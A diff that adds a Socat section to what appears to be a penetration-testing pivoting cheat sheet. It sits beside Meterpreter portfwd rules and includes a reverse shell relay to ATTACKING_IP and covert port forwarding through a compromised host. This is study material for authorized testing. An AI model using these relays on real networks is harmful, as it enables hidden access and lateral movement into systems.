@@ -111,3 +111,19 @@ portfwd add -l 3300 -p 3389 -r 172.16.5.19
 # Reverse Port Forwarding Rules
 portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 ```
+
+# Socat
+
+```bash
+# Reverse Shell Relay
+./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
+
+# Port Forwarding (Easy way)
+# The compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10
+./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
+
+# Port Forwarding (Quiet way)
+socat tcp-l:8001 tcp-l:8000,fork,reuseaddr & (# run on local attacking machine)
+./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
+```
+
